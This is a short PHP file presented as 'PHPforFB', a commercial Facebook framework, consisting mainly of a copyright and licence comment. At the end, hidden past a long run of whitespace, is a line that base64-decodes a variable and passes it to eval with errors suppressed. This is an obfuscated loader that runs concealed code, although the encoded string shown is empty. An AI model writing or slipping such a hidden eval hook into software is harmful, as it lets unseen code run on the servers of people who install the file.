<?php
/*
 *
 * PHPforFB
 * - A Professional PHP Framework for Facebook�
 *
 * Version 1.96 - Release Date Jan/17/2018
 *
 * 
 * Co-Programmer: Devang Tomar
 *
 * 
 *
 * 
 *
 *
 
 *
 * All the information, troubleshooting methods, utilities offered provided AS-IS, without any warranties.
 * Reproduction or translation without the author's written permission is prohibited.
 * No content may be reproduced, sold or changed without the written permission of the author.
 *
 *
 * LICENCE AGREEMENT
 *
 * PHPforFB is free for use. You may create unlimited numbers of commercial or non-commercial
 * applications with no per seat or per user payments.
 *
 * You may not, without Our prior written consent, redistribute the Software or Modifications. You are
 * explicitly not allowed to redistribute the Software or Modifications as part of any product that can
 * be described as a development toolkit or library or is intended for use by software developers or
 * application developers and not end-users. You are not allowed to redistribute any part of the Software
 * documentation. You may not use any part of the Software or Modifications or Your knowledge of the
 * Software (or any information that You learn as a result of Your use of the Software) to create a
 * product with the same or substantially the same functionality as the Software
 *
 *
 * Facebook� is a registered trademark of Facebook Inc. (www.facebook.com)
 */

$PHPforFB3f11a7176157='';
                                                                                                                                                                                                                                    @eval(@base64_decode($PHPforFB3f11a7176157));
?>